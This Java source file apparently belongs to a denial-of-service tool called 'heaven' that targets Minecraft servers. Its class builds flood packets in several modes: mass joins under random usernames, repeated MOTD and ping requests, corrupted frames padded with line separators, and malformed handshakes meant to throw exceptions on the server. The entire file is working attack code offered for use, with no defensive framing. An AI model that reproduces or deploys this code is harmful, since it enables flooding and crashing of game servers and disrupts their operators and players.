package heaven.attacks.implementations;

import heaven.attacks.Method;
import heaven.helpers.Letters;
import heaven.helpers.McStream;
import heaven.helpers.McVersion;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;

import java.net.InetSocketAddress;

public class Mc extends Method {
    String hostname;
    McVersion version;
    Type type;

    public Mc(String hostname, McVersion version, Type type) {
        this.hostname = hostname;
        this.version = version;
        this.type = type;
    }

    @Override
    public ByteBuf createData(InetSocketAddress target) {
        ByteBuf buffer = Unpooled.buffer();
        switch (type) {
            case JOIN -> {
                McStream.write(McStream.createHandshake(version, hostname, target.getPort(), 2), buffer);
                McStream.write(McStream.createLoginStart(version, Letters.getCasual(12)), buffer);
            }
            case MOTD -> {
                McStream.write(McStream.createHandshake(version, hostname, target.getPort(), 1), buffer);
                buffer.writeByte(1);
                buffer.writeByte(0);
            }
            case PING_OVERLOAD -> {
                McStream.write(McStream.createHandshake(version, hostname, target.getPort(), 1), buffer);
                for (int index = 0; index < 512; index++) {
                    buffer.writeByte(1);
                    buffer.writeByte(0);
                }
            }
            case CORRUPTED_FRAME -> {
                McStream.write(McStream.createHandshake(version, hostname, target.getPort(), 2), buffer);
                McStream.write(McStream.createLoginStart(version, Letters.getCasual(15)), buffer);
                for (int index = 0; index < 1024; index++)
                    McStream.write(System.lineSeparator(), buffer);
            }
            case EXCEPTION -> {
                switch ((int) (Math.random() * 3)) {
                    case 1 ->
                            McStream.write(McStream.createHandshake(McVersion.INVALID, hostname, target.getPort(), 1), buffer);
                    case 2 -> McStream.write(McStream.createHandshake(version, hostname, target.getPort(), -1), buffer);
                    case 3 -> {
                        McStream.write(McStream.createHandshake(version, hostname, target.getPort(), 2), buffer);
                        McStream.write(McStream.createLoginStart(version, ""), buffer);
                    }
                }
            }
        }
        return buffer;
    }

    public enum Type {
        JOIN("join"),
        MOTD("motd"),
        PING_OVERLOAD("ping-overload"),
        CORRUPTED_FRAME("corrupted-frame"),
        EXCEPTION("exception");
        final String identifier;

        Type(String identifier) {
            this.identifier = identifier;
        }

        public static Type getBy(String identifier) {
            for (Type type : values())
                if (identifier.equalsIgnoreCase(type.identifier)) return type;
            throw new NullPointerException("No Type with the name \"" + identifier + "\" was found.");
        }
    }
}
